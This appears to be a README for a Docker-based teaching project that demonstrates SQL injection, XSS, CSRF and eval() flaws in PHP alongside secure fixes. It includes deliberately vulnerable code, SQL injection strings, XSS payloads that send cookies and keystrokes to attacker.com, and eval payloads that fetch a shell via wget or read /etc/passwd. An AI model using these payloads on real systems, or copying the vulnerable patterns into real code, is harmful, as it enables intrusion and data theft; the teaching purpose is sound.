# Web Security: SQL Injection, XSS, and CSRF Demonstrations

## Project Overview

This project is a comprehensive web security vulnerability demonstration platform that illustrates common web application security flaws and their mitigations. The project contains working examples of SQL Injection (SQLI), Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and dangerous code evaluation vulnerabilities, providing hands-on learning experiences with both vulnerable and secure code implementations.

## Technical Skills Demonstrated

### Web Security Concepts
- **SQL Injection (SQLI)**: Database query manipulation vulnerabilities
- **Cross-Site Scripting (XSS)**: Client-side code injection attacks
- **Cross-Site Request Forgery (CSRF)**: Unauthorized command transmission
- **Code Evaluation Vulnerabilities**: Dangerous use of eval() and similar functions
- **Security Mitigation Techniques**: Prepared statements, input sanitization, CSRF tokens

### Technologies & Tools
- **PHP**: Server-side scripting and application logic
- **SQL/SQLite**: Database operations and query construction
- **Docker**: Container ization for isolated demonstration environments
- **Apache**: Web server configuration and deployment
- **HTML/CSS/JavaScript**: Frontend security demonstration interfaces
- **Session Management**: Cookie handling and authentication flows

### Security Techniques
- **Input Validation**: Preventing malicious data entry
- **Output Encoding**: Preventing XSS through proper escaping
- **Parameterized Queries**: SQL injection prevention
- **CSRF Token Implementation**: Request forgery protection
- **Content Security Policy**: Browser-level security controls

---

## Project Structure

```
18_Web_Security_SQLI_XSS_CSRF/
├── web-lecture-demos/
│   ├── webroot/                    # Web application files
│   │   ├── 01-client-csrf/        # CSRF demonstrations
│   │   │   ├── index.php          # Vulnerable CSRF example
│   │   │   ├── better.php         # Secure implementation with tokens
│   │   │   ├── do-csrf.html       # Attack demonstration
│   │   │   └── csrf/              # Additional CSRF examples
│   │   │
│   │   ├── 02-sqli/               # SQL Injection demonstrations
│   │   │   ├── login.php          # Vulnerable login form
│   │   │   ├── index.php          # Main SQLI demo interface
│   │   │   ├── db.php             # Database connection layer
│   │   │   ├── db.sqlite          # SQLite database
│   │   │   └── setup.php          # Database initialization
│   │   │
│   │   ├── 03-xss/                # XSS demonstrations (basic)
│   │   │   ├── index.php          # Main page with XSS vulnerability
│   │   │   ├── comments.php       # Comment system demo
│   │   │   ├── steal.html         # Cookie stealing demo
│   │   │   └── db.sqlite          # Database for comments
│   │   │
│   │   ├── 04-xss-02/             # XSS demonstrations (advanced)
│   │   │   ├── index.php          # Advanced XSS scenarios
│   │   │   ├── comments.php       # Persistent XSS examples
│   │   │   └── 404.php            # Error page XSS
│   │   │
│   │   ├── 05-eval/               # Code evaluation vulnerabilities
│   │   │   └── index.php          # Dangerous eval() examples
│   │   │
│   │   └── index.html             # Demo navigation page
│   │
│   ├── docker-support/            # Docker configuration files
│   │   ├── apache2-config.conf    # Apache configuration
│   │   ├── apache2-run            # Apache startup script
│   │   ├── entrypoint             # Container entry point
│   │   └── php.ini.append         # PHP configuration
│   │
│   ├── Dockerfile                 # Container image definition
│   ├── Dockerfile.arm64           # ARM64-specific build
│   ├── run-container              # Container management script
│   └── README.md                  # Original project documentation
│
└── bob-router/                    # Routing configuration
    └── run-container              # Router container script
```

---

## Security Vulnerabilities Demonstrated

### 1. Cross-Site Request Forgery (CSRF)

**Location**: `webroot/01-client-csrf/`

**Vulnerability Description**:
CSRF attacks trick authenticated users into performing unwanted actions on web applications where they're currently authenticated. The vulnerable implementation accepts state-changing requests without verifying their origin.

**Vulnerable Code Pattern**:
```php
// index.php - Vulnerable to CSRF
if ($_GET['action'] == 'update') {
    // Direct parameter usage without token validation
    $newValue = $_GET['value'];
    updateUserPreference($newValue);
}
```

**Attack Demonstration**:
```html
<!-- do-csrf.html - Attacker's page -->
<img src="http://victim-site.com/update.php?action=update&value=malicious">
```

**Secure Implementation**:
```php
// better.php - Protected with CSRF tokens
session_start();
if (!isset($_POST['csrf_token']) || 
    $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

**Key Learning Points**:
- CSRF tokens provide request origin validation
- State-changing operations should use POST, not GET
- Same-Site cookie attributes add defense-in-depth
- Referer header validation provides additional protection

---

### 2. SQL Injection (SQLI)

**Location**: `webroot/02-sqli/`

**Vulnerability Description**:
SQL injection occurs when untrusted data is concatenated directly into SQL queries, allowing attackers to manipulate database operations, bypass authentication, extract sensitive data, or modify database contents.

**Vulnerable Code Pattern**:
```php
// login.php - Vulnerable to SQL injection
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = $db->query($query);
```

**Attack Examples**:
```sql
-- Authentication bypass
Username: admin' --
Password: [anything]

-- Data extraction
Username: ' UNION SELECT password FROM users --

-- Database modification
Username: '; DROP TABLE users; --
```

**Secure Implementation**:
```php
// Prepared statements prevent SQL injection
$stmt = $db->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

**Key Learning Points**:
- Never concatenate user input into SQL queries
- Use parameterized queries (prepared statements)
- Implement input validation as defense-in-depth
- Least privilege database permissions limit damage
- Use ORM frameworks for additional abstraction

---

### 3. Cross-Site Scripting (XSS)

**Location**: `webroot/03-xss/` and `webroot/04-xss-02/`

**Vulnerability Description**:
XSS allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, credential theft, malware distribution, and website defacement.

**Types Demonstrated**:

**Reflected XSS**:
```php
// Immediate reflection of user input
echo "Search results for: " . $_GET['query'];
// Attack: ?query=<script>alert(document.cookie)</script>
```

**Stored XSS** (Persistent):
```php
// comments.php - Stores unsanitized user input
$comment = $_POST['comment'];
$db->query("INSERT INTO comments (text) VALUES ('$comment')");
// Later displays without encoding:
echo $row['text']; // XSS payload executes for all users
```

**DOM-Based XSS**:
```javascript
// Client-side vulnerability
document.getElementById('output').innerHTML = location.hash.substring(1);
// Attack: #<img src=x onerror=alert(document.cookie)>
```

**Attack Demonstrations**:
```html
<!-- Cookie stealing -->
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Session hijacking -->
<script>
  new Image().src = 'http://attacker.com/log?session=' + document.cookie;
</script>

<!-- Keylogging -->
<script>
  document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/keys?key=' + e.key);
  });
</script>
```

**Secure Implementation**:
```php
// Output encoding prevents XSS
echo htmlspecialchars($_GET['query'], ENT_QUOTES, 'UTF-8');

// For JSON contexts
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);

// Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**Key Learning Points**:
- Always encode output based on context (HTML, JavaScript, URL, CSS)
- Use Content Security Policy (CSP) headers
- Implement HTTPOnly and Secure flags on cookies
- Validate and sanitize all user input
- Use modern frameworks with automatic XSS protection

---

### 4. Code Evaluation Vulnerabilities

**Location**: `webroot/05-eval/`

**Vulnerability Description**:
Using eval() or similar functions with user-controlled input allows attackers to execute arbitrary code on the server, leading to complete system compromise.

**Vulnerable Code Pattern**:
```php
// index.php - Extremely dangerous
$input = $_GET['expression'];
eval($input); // Allows arbitrary PHP execution
```

**Attack Examples**:
```php
// File system access
?expression=system('ls -la');

// Remote code execution
?expression=shell_exec('wget http://attacker.com/shell.php');

// Data exfiltration
?expression=file_get_contents('/etc/passwd');
```

**Secure Alternatives**:
```php
// Use specific functions instead of eval
$allowed_operations = [
    'add' => function($a, $b) { return $a + $b; },
    'multiply' => function($a, $b) { return $a * $b; }
];

$operation = $_GET['op'];
if (isset($allowed_operations[$operation])) {
    return $allowed_operations[$operation]($val1, $val2);
}
```

**Key Learning Points**:
- Never use eval() with user input
- Whitelist allowed operations rather than blacklisting
- Use sandboxed environments for code execution
- Implement strict input validation
- Apply principle of least privilege

---

## Docker Container Environment

### Container Architecture

The project uses Docker to provide isolated, reproducible demonstration environments:

**Key Features**:
- **Apache Web Server**: Configured with PHP support
- **SQLite Database**: Lightweight database for demonstrations
- **Volume Mounting**: Live code editing without rebuilding
- **Network Isolation**: Contained environment for safe vulnerability testing

### Container Management

**Initial Setup**:
```bash
cd web-lecture-demos
./run-container setup
```

**Starting the Server**:
```bash
./run-container start
# Access at http://localhost:9080
```

**Getting a Shell** (for debugging):
```bash
./run-container shell
```

**Resetting Environment**:
```bash
./run-container --clean start
```

**Removing Everything**:
```bash
./run-container clean-image
```

### Docker Configuration Details

**Dockerfile Highlights**:
- Base image: PHP with Apache
- SQLite extension enabled
- Custom Apache configuration for security demonstrations
- PHP configuration with specific security settings
- Volume mounting for live code updates

**Apache Configuration** (`apache2-config.conf`):
- Configured to serve from `/webroot`
- PHP processing enabled
- Custom error pages
- Security headers (configurable for demonstrations)

---

## Security Mitigation Techniques

### Defense in Depth

1. **Input Validation**
   - Whitelist acceptable input patterns
   - Reject rather than sanitize suspicious input
   - Type checking and length limits

2. **Output Encoding**
   - Context-aware encoding (HTML, JavaScript, URL, CSS)
   - Use framework functions (htmlspecialchars, json_encode)
   - Template engines with auto-escaping

3. **Authentication & Authorization**
   - Secure session management
   - HTTPOnly and Secure cookie flags
   - Proper logout functionality
   - Session regeneration after privilege changes

4. **CSRF Protection**
   - Synchronizer tokens
   - Double-submit cookies
   - Same-Site cookie attribute
   - Custom request headers

5. **SQL Injection Prevention**
   - Parameterized queries
   - ORM usage
   - Least privilege database accounts
   - Input validation

6. **XSS Prevention**
   - Output encoding
   - Content Security Policy
   - HTTPOnly cookies
   - X-XSS-Protection header

7. **General Best Practices**
   - Security headers (CSP, X-Frame-Options, etc.)
   - HTTPS enforcement
   - Regular security updates
   - Security testing in CI/CD

---

## Learning Outcomes

### Security Awareness
- Understanding common web vulnerabilities
- Recognizing insecure code patterns
- Implementing secure coding practices
- Defense-in-depth security strategy

### Practical Skills
- **Vulnerability Assessment**: Identifying security flaws in code
- **Secure Development**: Writing code resistant to common attacks
- **Security Testing**: Validating security controls
- **Incident Response**: Understanding attack vectors and impacts

### Real-World Applications
- **Secure Application Development**: Building security into SDLC
- **Security Auditing**: Reviewing code for vulnerabilities
- **Penetration Testing**: Understanding attacker methodologies
- **Security Training**: Teaching secure coding practices

---

## Educational Value

This project provides hands-on experience with:

1. **Vulnerability Discovery**
   - Analyzing code for security flaws
   - Understanding attack vectors
   - Testing security controls

2. **Exploit Development**
   - Crafting payloads for demonstrations
   - Understanding attack mechanics
   - Bypass technique exploration

3. **Mitigation Implementation**
   - Applying security patches
   - Implementing security controls
   - Validating fixes

4. **Security Engineering**
   - Secure design principles
   - Defense-in-depth strategies
   - Security architecture decisions

---

## Advanced Topics Explored

### Session Management Security
- Session fixation prevention
- Session hijacking mitigation
- Secure session storage
- Session timeout implementation

### Authentication Security
- Password hashing (bcrypt, Argon2)
- Salting and key stretching
- Multi-factor authentication concepts
- Credential storage best practices

### Database Security
- Parameterized queries and prepared statements
- Stored procedures for access control
- Database encryption
- Connection security

### HTTP Security Headers
- **Content-Security-Policy**: XSS and data injection prevention
- **X-Frame-Options**: Clickjacking protection
- **X-Content-Type-Options**: MIME-sniffing prevention
- **Strict-Transport-Security**: HTTPS enforcement

### Modern Security Standards
- OWASP Top 10 vulnerabilities
- CWE/SANS Top 25 software errors
- OWASP ASVS (Application Security Verification Standard)
- Secure coding guidelines (CERT, OWASP)

---

## Technical Implementation Details

### PHP Security Features
- `htmlspecialchars()` for output encoding
- `filter_input()` for input validation
- `password_hash()` for credential storage
- PDO/MySQLi prepared statements

### JavaScript Security
- DOM manipulation security
- Event handler safety
- JSON parsing security
- Cookie security attributes

### Database Operations
- Prepared statement usage
- Transaction management
- Error handling without information disclosure
- Least privilege access control

---

## Skills Developed

### Core Competencies
- **Web Application Security**: Understanding vulnerabilities and mitigations
- **Secure Coding**: Writing security-conscious code
- **Security Testing**: Identifying and validating security issues
- **Containerization**: Using Docker for isolated environments
- **PHP Development**: Server-side web application programming

### Security-Specific Skills
- **Threat Modeling**: Identifying potential attack vectors
- **Risk Assessment**: Evaluating security impact
- **Security Architecture**: Designing secure systems
- **Compliance Understanding**: Security standards and regulations

### Professional Development
- **Security Best Practices**: Industry-standard secure coding
- **Code Review**: Security-focused code analysis
- **Documentation**: Security documentation and reporting
- **Education**: Teaching and explaining security concepts

---

## Real-World Applications

This project demonstrates skills directly applicable to:

1. **Application Security Engineering**
   - Building secure web applications
   - Implementing security controls
   - Security code review

2. **Security Consulting**
   - Vulnerability assessment
   - Penetration testing
   - Security training delivery

3. **DevSecOps**
   - Security integration in CI/CD
   - Automated security testing
   - Security monitoring

4. **Compliance & Audit**
   - Security standard compliance
   - Security audit preparation
   - Risk assessment

---

## Project Context

This project serves as an educational platform for understanding web security vulnerabilities. It intentionally contains insecure code patterns for demonstration purposes, alongside secure implementations showing proper mitigation techniques. The Docker-based approach ensures safe, isolated environments for security testing and learning.

**⚠️ WARNING**: This code contains intentional security vulnerabilities for educational purposes. Never deploy this code in production environments or use it as a foundation for real applications without proper security review and hardening.

---

## Technical Stack Summary

- **Backend**: PHP, SQLite
- **Frontend**: HTML, CSS, JavaScript
- **Server**: Apache HTTP Server
- **Container**: Docker
- **Security**: Various security headers, CSP, CSRF tokens
- **Database**: SQLite with SQL injection demonstrations

---

## Additional Resources

### OWASP Resources
- OWASP Top 10 Web Application Security Risks
- OWASP Cheat Sheet Series
- OWASP ZAP (Security Testing Tool)
- OWASP ASVS (Application Security Verification Standard)

### Security Standards
- CWE (Common Weakness Enumeration)
- CVE (Common Vulnerabilities and Exposures)
- SANS Top 25 Most Dangerous Software Errors
- NIST Cybersecurity Framework

### Learning Platforms
- PortSwigger Web Security Academy
- OWASP WebGoat
- Hack The Box
- TryHackMe

---

*This project demonstrates practical web security concepts through hands-on vulnerability demonstrations and secure coding examples, providing essential skills for building and maintaining secure web applications.*

